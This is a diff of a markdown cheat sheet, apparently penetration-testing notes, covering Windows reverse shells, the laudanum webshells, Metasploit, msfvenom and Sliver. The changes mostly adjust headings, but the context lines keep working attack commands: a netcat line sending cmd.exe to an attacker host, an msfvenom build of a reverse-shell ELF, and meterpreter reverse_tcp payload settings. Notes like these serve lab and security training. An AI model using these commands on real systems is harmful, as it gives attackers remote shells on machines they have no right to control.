@@ -1,4 +1,5 @@
 
+
 # Windows reverse shells
 ## Basic powershell reverse shell
 
@@ -22,9 +23,9 @@ nc.exe %ATTACKER_IP% %PORT% -e cmd.exe
 ## Nishang
 
 
-## Webshells
+# Webshells
 
-### laudanum
+## laudanum
 Find the type of shell needed, make copy
 
 
@@ -58,15 +59,15 @@ Upload go to shell page
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/49b877f9-8979-4760-9b1f-038c410c9e7f)
 
 
-## Shells with Metasploit
+# Shells with Metasploit
 
-### Staged vs non staged
+## Staged vs non staged
 ```
 In Metasploit, the “/” character is used to denote whether a payload is staged or not,
 so shell_reverse_tcp at index 20 is not staged, whereas shell/reverse_tcp at index 15 is.
 ```
 
-### msfvenom
+## msfvenom
 
 ![Pasted image 20230508141045](https://github.com/dbissell6/Shadow_Stone/assets/50979196/988055f3-d9a3-4b0a-9e5b-be91b0886c30)
 
@@ -75,7 +76,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.34 LPORT=9999 -f elf -o s
 ```
 
 
-### msfconsole
+## msfconsole
 
 g will set variable as global, useful when trying different exploits
 `setg rhosts 10.10.10.10`
@@ -87,7 +88,7 @@ g will set variable as global, useful when trying different exploits
 `set payload windows/meterpreter/reverse_tcp`
 
 
-### show system arch vs payload arch
+## show system arch vs payload arch
 
 ![Pasted image 20230508154055](https://github.com/dbissell6/Shadow_Stone/assets/50979196/31f9ac3d-5efb-4b31-9237-f0b652376925)
 
@@ -95,7 +96,7 @@ Now can
 ```
 set payload windows/x64/meterpreter/reverse_tcp
 ```
-## Sliver
+# Sliver
 
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/47d173f7-f725-4f09-a7d5-407fd6d67398)
 
